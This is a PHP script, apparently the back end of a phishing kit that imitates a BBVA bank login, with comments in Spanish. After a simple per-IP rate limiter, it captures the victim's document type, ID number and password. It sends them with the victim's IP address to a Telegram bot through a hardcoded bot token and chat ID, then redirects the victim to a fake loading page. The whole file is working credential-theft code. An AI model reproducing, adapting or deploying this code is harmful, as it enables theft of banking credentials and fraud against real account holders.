<?php
session_start();

// === CONFIGURACIÓN DEL RATE LIMITING ===
$max_intentos = 10;
$tiempo_bloqueo = 60; // segundos

function obtenerIPReal() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

$ip = obtenerIPReal();
$registro_dir = __DIR__ . '/rate_limit/';
$registro_archivo = $registro_dir . md5($ip) . '.txt';

// Crear directorio si no existe
if (!file_exists($registro_dir)) {
    mkdir($registro_dir, 0755, true);
}

// Leer archivo de intentos
$intentos = 0;
$primer_intento = time();

if (file_exists($registro_archivo)) {
    $datos = explode('|', file_get_contents($registro_archivo));
    $intentos = (int)$datos[0];
    $primer_intento = (int)$datos[1];

    if ((time() - $primer_intento) > $tiempo_bloqueo) {
        $intentos = 0;
        $primer_intento = time();
    }
}

// Bloquear si excede límite
if ($intentos >= $max_intentos) {
    http_response_code(429);
    die("Demasiadas solicitudes desde esta IP. Intenta de nuevo en unos minutos.");
}

// Incrementar y guardar intento
$intentos++;
file_put_contents($registro_archivo, "$intentos|$primer_intento");

// === LÓGICA DEL FORMULARIO POST ===
if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    // Sanitizar datos del formulario usando htmlspecialchars()
    $tipoDoc = htmlspecialchars($_POST['tipodoc'], ENT_QUOTES, 'UTF-8');
    $usr = htmlspecialchars($_POST['numdoc'], ENT_QUOTES, 'UTF-8');
    $psw = htmlspecialchars($_POST['clvs'], ENT_QUOTES, 'UTF-8');

    // Almacenar el nombre de usuario en la sesión
    $_SESSION['username'] = $usr;

    // Mensaje a enviar
    $ip = $_SERVER['REMOTE_ADDR'];
    $botToken = '7784321740:AAFShKdl2ALYn7cYPdc--sUoYRd7un2NZPw';
    $chatId = '7414408766';
    $text = "BBVA | @BRKNSHINEXXX\n----\n$tipoDoc: $usr\nP4SWD: $psw\nIP: $ip";
    $url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($text);

    // Enviar la solicitud HTTP GET a la API de Telegram usando cURL
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);

    // Comprobar si el mensaje fue enviado exitosamente
    if ($response) {
        header("Location: ../cargando.html");
        exit; // Asegúrate de llamar a exit después de redirigir
    } else {
        echo "Error al enviar el mensaje.";
    }
} else {
    die('Método de solicitud no permitido.');
}
?>
